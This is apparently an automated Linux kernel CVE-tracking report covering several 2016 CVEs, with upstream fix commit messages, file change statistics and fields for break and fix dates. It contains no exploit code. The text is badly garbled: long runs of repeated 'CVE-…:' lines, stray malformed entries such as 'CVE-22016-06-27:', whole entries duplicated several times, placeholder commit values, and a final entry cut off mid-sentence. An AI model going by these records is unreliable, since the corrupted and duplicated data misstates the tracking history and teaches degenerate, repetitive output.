Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
